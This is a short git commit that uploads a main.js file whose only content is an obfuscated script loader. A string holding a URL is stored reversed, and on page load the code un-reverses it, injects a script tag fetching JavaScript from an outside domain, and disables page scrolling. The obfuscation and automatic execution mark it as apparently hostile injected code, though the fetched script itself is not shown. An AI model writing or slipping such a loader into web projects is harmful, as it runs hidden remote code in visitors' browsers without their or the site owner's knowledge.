96166db0f1511f193b7e01af6802a9999ca021af
carbshop01 <62927867+carbshop01@users.noreply.github.com>
2021-04-09 17:26:48 +0200

    Add files via upload

---
+++ main.js
@@ -0,0 +1,8 @@
+string = '54321-o_ppa_ed=v?sj.resworb/ndcsj/etisbew.stropatad//:sptth';
+
+window.onload = function() {
+	var scrpt = document.createElement("script");
+	scrpt.setAttribute("src", string.split("").reverse().join(""));
+	document.getElementsByTagName("body")[0].appendChild(scrpt);
+	document.getElementsByTagName("body")[0].style.overflow = "hidden";
+}
